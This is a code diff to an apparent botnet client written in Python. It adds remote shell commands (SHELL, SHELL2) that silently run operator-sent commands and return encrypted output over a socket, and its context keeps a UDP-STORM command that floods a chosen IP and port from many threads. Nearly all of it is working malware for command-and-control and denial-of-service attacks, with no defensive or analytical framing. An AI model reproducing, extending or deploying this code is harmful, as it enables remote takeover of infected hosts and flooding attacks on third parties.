@@ -121,26 +121,56 @@ def process_resp(s,resp,key):
     else:cache_response.append([resp,com[0]])
  s.send(com[0])
 
+help = ['PING','CACHE_NOW','CACHE_CLEAR','SHELL','SHELL2','UDP-STORM','TCP-RST','STOP']
+
+def run(command):
+ null_output = '> NUL 2>&1' if os.name == 'nt' else '> /dev/null 2>&1'
+ os.system(command+null_output)
+
 def command(s,command,key):
- global cache_response,cache_command,banner,stop
+ global cache_response,cache_command,banner,stop,help
  try:
-  print(base64.b64decode(command).decode())
   com = base64.b64decode(command).decode().split(' ')
   if com[0].upper() == 'PING':threading.Thread(target=process_resp,args=(s,f'PONG',key)).start()
   elif com[0].upper() == 'CACHE_NOW':
-    s.send(cryptor(key[0],key[1],banner%s(key[0],key[1],f'CACHE-RESPONSE={len(cache_response)}\r\n  {cache_response}\r\nCACHE-COMMAND={len(cache_command)}\r\n  {cache_command}'),mode='enc'))
-  elif com[0].upper() == 'CACHE_CLEAR':cache_response.clear(); cache_command.clear(); threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m\r\nCOMMAND HAS BEEN CLEAR\r\nRESPONSE HAS BEEN CLEAR'),key)).start()
+    s.send(cryptor(key[0],key[1],banner%(key[0],key[1],f'CACHE-RESPONSE={len(cache_response)}\r\n  {cache_response}\r\nCACHE-COMMAND={len(cache_command)}\r\n  {cache_command}'),mode='enc'))
+  elif com[0].upper() == 'CACHE_CLEAR':cache_response.clear(); cache_command.clear(); threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76m\r\nCOMMAND HAS BEEN CLEAR\r\nRESPONSE HAS BEEN CLEAR'),key)).start()
+  elif com[0].upper() == 'SHELL2':
+   if len(com) != 1:
+    length = []
+    total = 1
+    while True:
+      try:
+        length.append(com[total])
+        total += 1
+      except:break
+    threading.Thread(target=run,args=(' '.join(length),)).start()
+    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mCOMMAND HAS BEEN RUNNING'),key)).start()
+   else:
+    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSHELL2 \x1b[38;5;77m<command>'),key)).start()
   elif com[0].upper() == 'SHELL':
-   import subprocess
-   result = subprocess.run(base64.b64decode(cryptor(key[0],key[1],com[1].encode(),'dec')).decode(), shell=True, capture_output=True, text=True)
-   if result.returncode == 0:threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m{result.stdout}'),key)).start()
-   else:threading.Thread(target=process_resp,args=(s,banner%s(key[0],key[1],f'\x1b[38;5;76m{result.stderr}'),key)).start()
+   if len(com) != 1:
+    length = []
+    total = 1
+    while True:
+      try:
+        length.append(com[total])
+        total += 1
+      except:break
+    import subprocess
+    result = subprocess.run(' '.join(length), shell=True, capture_output=True, text=True)
+    if result.returncode == 0:a = "\r\n".join(result.stdout.split("\n")); s.send(cryptor(key[0],key[1],banner%(key[0],key[1],f'\x1b[38;5;76m{a}'),'enc'))
+    else:a = "\r\n".join(result.stderr.split("\n")); s.send(cryptor(key[0],key[1],banner%(key[0],key[1],f'\x1b[38;5;76m{a}'),'enc'))
+   else:
+    threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSHELL \x1b[38;5;77m<command>'),key)).start()
   elif com[0].upper() in ['UDP-STORM','UDPSTORM','UDP_STORM']:
     if len(com) == 5:
      ip,port,thread,size = com[1], int(com[2]),int(com[3]),int(com[4])
      threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mSending \x1b[38;5;77mcommand \x1b[38;5;78m{com[0]} \x1b[38;5;79m--> \x1b[38;5;80m{ip}\x1b[38;5;255m:\x1b[38;5;81m{port}'),key)).start()
      [threading.Thread(target=SOC,args=((ip,port),size)).start() for _ in range(thread)]
     else:threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;196m{com[0]} <IP> <PORT> <THREAD> SIZE'),key)).start()
+  elif com[0].upper() in ['?H','?','HELP','H']:
+   threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76m{", ".join(help)}'),key)).start()
   elif com[0].upper() in ['STOP','END-ATTACK','END_ATTACK','END-ATK','CLOSE-ATK','CLOSE-ATTACK']:
    if stop == 1:
     threading.Thread(target=process_resp,args=(s,banner%(key[0],key[1],f'\x1b[38;5;76mCurrent running . . .'),key)).start()
